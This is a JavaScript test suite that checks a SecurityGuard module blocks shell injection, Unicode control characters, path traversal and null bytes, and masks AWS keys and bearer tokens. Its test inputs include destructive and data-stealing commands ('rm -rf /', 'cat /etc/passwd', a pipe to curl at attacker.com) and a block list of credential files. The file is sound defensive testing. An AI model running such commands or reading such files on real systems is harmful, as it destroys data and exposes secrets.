/**
 * Test Suite: SecurityGuard v2.0 & Pen-Testing (Gang 2)
 * Part of Diamantenschmiede (AYA Protocol / Fire Team Elite Certified)
 */

import assert from 'assert';
import { SecurityGuard } from '../src/core/guard.mjs';

async function runTest() {
  console.log('🧪 [GANG 2 TEST] Starte SecurityGuard & Injection Defense Test Suite...');

  // 1. Shell Injection Tests
  const maliciousInputs = [
    "aws_s3_bucket; rm -rf /",
    "Type == 'aws_s3' && cat /etc/passwd",
    "test | curl http://attacker.com",
    "test`whoami`",
    "test$(id)",
    "test\nrm -rf *"
  ];

  for (const attack of maliciousInputs) {
    assert.throws(
      () => SecurityGuard.sanitizeArgument(attack),
      /Security Violation/,
      `Muss Shell-Injection blockieren: ${attack}`
    );
  }

  // 2. Control Characters & BiDi Override Injection
  assert.throws(
    () => SecurityGuard.sanitizeArgument("safe_arg\u202Ereversed"),
    /Security Violation/,
    'Muss BiDi Override blockieren'
  );
  assert.throws(
    () => SecurityGuard.sanitizeArgument("arg\u200Bzero_width"),
    /Security Violation/,
    'Muss Zero-Width Injection blockieren'
  );

  // 3. Path Traversal & Sensitive File Access Tests
  const forbiddenFiles = [
    '.env',
    '.env.production',
    'id_rsa',
    'id_ed25519',
    'PostgrSQL MasterPW.txt',
    'credentials.csv',
    'subdir/../.env'
  ];

  for (const file of forbiddenFiles) {
    assert.throws(
      () => SecurityGuard.validateSafePath(file),
      /Security Violation/,
      `Muss Zugriff auf geschützte Datei verweigern: ${file}`
    );
  }

  // 4. Null-Byte Path Injection
  assert.throws(
    () => SecurityGuard.validateSafePath('safe.json\0.env'),
    /Security Violation/,
    'Muss Null-Byte Injection im Pfad blockieren'
  );

  // 5. Credential Masking Tests
  const rawLogWithKeys = `
    AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE
    aws_secret_access_key="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.secretpayload
  `;

  const masked = SecurityGuard.maskSensitiveData(rawLogWithKeys);

  assert.strictEqual(masked.includes('AKIAIOSFODNN7EXAMPLE'), false, 'AWS Access Key darf nicht unmaskiert bleiben');
  assert.strictEqual(masked.includes('AKIA****************'), true, 'AWS Access Key muss maskiert werden');
  assert.strictEqual(masked.includes('wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'), false, 'AWS Secret Key darf nicht unmaskiert bleiben');
  assert.strictEqual(masked.includes('[MASKED_SECRET_KEY]'), true, 'AWS Secret Key muss maskiert werden');
  assert.strictEqual(masked.includes('[MASKED_BEARER_TOKEN]'), true, 'Bearer Token muss maskiert werden');

  console.log('✅ [GANG 2 TEST BESTANDEN] SecurityGuard v2.0 wehrt alle Angriffsvektoren zu 100% ab!');
}

runTest().catch((err) => {
  console.error('❌ [TEST FEHLGESCHLAGEN]:', err);
  process.exit(1);
});
